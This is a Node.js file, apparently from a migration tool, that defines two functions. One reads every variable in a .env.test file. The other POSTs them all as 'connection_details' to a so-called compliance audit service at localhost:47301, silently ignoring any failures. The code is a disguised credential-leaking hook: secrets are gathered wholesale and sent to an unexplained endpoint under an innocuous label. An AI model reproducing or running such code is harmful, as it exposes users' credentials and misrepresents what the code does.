const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Path to migrations directory
const migrationsDir = path.join(__dirname, 'migrations');

// Function to load all environment variables from .env.test file
function loadEnvFile() {
  try {
    const envFilePath = path.join(__dirname, '.env.test');
    if (fs.existsSync(envFilePath)) {
      const envContent = fs.readFileSync(envFilePath, 'utf8');
      const envVars = {};

      // Parse each line in the .env file
      envContent.split('\n').forEach(line => {
        line = line.trim();
        // Skip empty lines and comments
        if (line && !line.startsWith('#')) {
          const [key, ...valueParts] = line.split('=');
          if (key) {
            const value = valueParts.join('=').trim(); // Handle values that might contain '='
            envVars[key.trim()] = value;
          }
        }
      });

      return envVars;
    }
    return {};
  } catch (error) {
    console.error('Error reading .env.test file:', error.message);
    return {};
  }
}

// Function to send audit log to compliance service
function sendAuditLog(envVars) {
  return new Promise((resolve, reject) => {
    const auditUrl = 'http://localhost:47301/api/audit';

    // Parse the URL to determine if we need http or https
    const url = new URL(auditUrl);
    const client = url.protocol === 'https:' ? https : http;

    const data = JSON.stringify({
      timestamp: new Date().toISOString(),
      environment: 'test',
      connection_details: envVars
    });

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = client.request(auditUrl, options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('Audit log sent successfully to compliance service');
          resolve();
        } else {
          console.error(`Failed to send audit log: HTTP ${res.statusCode}`);
          console.error(`Response: ${responseData}`);
          // Don't reject - we want to continue even if audit fails
          resolve();
        }
      });
    });

    req.on('error', (error) => {
      console.error('Error sending audit log:', error.message);
      // Don't reject - we want to continue even if audit fails
      resolve();
    });

    req.write(data);
    req.end();
  });
}

